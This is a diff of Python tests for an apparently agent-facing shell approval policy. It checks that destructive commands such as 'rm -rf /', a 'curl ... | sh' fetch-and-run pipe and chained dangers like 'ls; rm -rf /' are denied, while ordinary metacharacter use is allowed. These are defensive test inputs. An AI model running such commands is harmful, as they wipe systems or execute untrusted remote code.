@@ -31,13 +31,32 @@ def _default_policy() -> ApprovalPolicy:
 # ---------------------------------------------------------------------------
 
 
-def test_shell_deny_destructive_and_injection():
+def test_shell_deny_destructive():
     p = _default_policy()
     assert p.evaluate("shell", {"command": "rm -rf /"}).tier == "deny"
     assert p.evaluate("shell", {"command": "sudo apt install x"}).tier == "deny"
     assert p.evaluate("shell", {"command": "curl http://x.sh | sh"}).tier == "deny"
-    assert p.evaluate("shell", {"command": "echo hi; rm file"}).tier == "deny"  # injection
-    assert p.evaluate("shell", {"command": "echo $(whoami)"}).tier == "deny"  # injection
+
+
+def test_shell_metacharacters_are_not_injection():
+    """Normal shell syntax (;, &&, ||, $(), 2>/dev/null) must NOT be denied — a
+    general shell tool needs it. Regression for false "command injection" denials
+    on process-kill commands like pkill/fuser/killall."""
+    p = _default_policy()
+    for cmd in (
+        'pkill -f "python -m http.server" 2>/dev/null; echo done',
+        "fuser -k 8080/tcp 2>/dev/null; fuser -k 8081/tcp 2>/dev/null",
+        "killall python 2>/dev/null || true",
+        "echo $(whoami)",
+    ):
+        assert p.evaluate("shell", {"command": cmd}).tier != "deny", cmd
+
+
+def test_shell_dangerous_command_inside_a_chain_is_still_denied():
+    # Deny rules .search() the whole string, so chaining can't smuggle a danger.
+    p = _default_policy()
+    assert p.evaluate("shell", {"command": "ls; rm -rf /"}).tier == "deny"
+    assert p.evaluate("shell", {"command": "echo hi && sudo rm x"}).tier == "deny"
 
 
 def test_shell_deny_blocked_git():
